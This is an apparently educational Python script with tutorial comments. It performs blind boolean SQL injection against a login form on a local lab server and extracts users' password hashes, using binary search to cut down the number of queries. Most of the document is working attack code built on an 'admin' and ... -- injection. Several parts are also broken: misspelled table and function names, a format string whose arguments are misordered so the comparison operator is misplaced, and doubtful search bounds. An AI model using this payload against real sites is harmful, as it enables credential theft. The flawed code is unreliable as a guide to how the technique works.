# exploiting a restricted SQL injection

# Why not use SQLmap?
# -What if the tool can't find the query?
# -What if there was a limit on the number of queries?

# How did our SQLi work anyway?
# - Blind SQLi - we can extract 1 piece of information in a request (True or False)
# - i.e. the injection works on each of the values at the given index of the given value, something like 0123456789abcdef

# What if we could only make 128 queries?
# - 32 character MD5 password
# - 16 options per character
# - 128/32 = 4 requests per character (we need to be able to extract correct character with only 4 requests for each index)

# From above calculations, it is tricky to do with existing tools, so we can solve the problem with out custom script

# Solving the restriction problem of only being able to make four requests for each character at each index of the password hash
# Solution: Binary search

# Binary search
# We know the minimum and maximum values (0 and f)
# Instead of guessing  the unknown value, compare with the middle
# - If less, compare again, with a new minimum and maximum from the left
# - If more, compare again, with a new minimum and maximum from the right



# Implementing the binary search in our SQL injection script

# exploiting a web server using SQL injection

import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
	global total_queries
	r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password": "password"})
	total_queries += 1
	return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
	payload = "(select hex(substr(password, {}, 1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, character, operator)
	return injected_query(payload)

def invalid_user(user_id):
	payload = "(select id from uesr where id = {}) >= 0".format(user_id)
	return injected_qurey(payload)

def password_length(user_id):
	i = 0
	while True:
		payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
		if not injected_query(payload):
			return i
		i += 1

# def extract_hash(charset, user_id, password_length):
# 	found = ""
# 	for i in range(0, password_length):
# 		for j in range(len(charset)):
# 			if boolean_query(i, user_id, charset[j]):
# 				found += charset[j]
# 				break
# 	return found

def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total queries!".format(total_queries))
	total_queries = 0

# this is an extra function added to our custom SQLi script
# this function uses binary search approach or algorithem to extract the hash
def extract_hash_bs(charset, user_id, password_length):
	found = ""
	for index in range(0, password_length):
		start = 0
		end = len(charset) - 1
		while start <= end:
			if end - start == 1:
				if start == 0 and boolean_query(index, user_id, charset[start]):
					found += charset[start]
				else:
					found += charset[start + 1]
				break
			else:
				middle = (start + end) // 2
				if boolean_query(index, user_id, charset[middle]):
					end = middle
				else:
					start = middle
	return found

while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
			total_queries_taken()
			# print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
			# total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash_bs(charset, int(user_id), user_password_length)))     # this is added, here extract_hash_bs() function is used to implement binary serach to get the hash, instead of extract_hash(), which uses sequential approach
			total_queries_taken()
		else:
			print("\t[X] User {} does not exist!".format(user_id))
	except KeyboardInterrupt:
		break
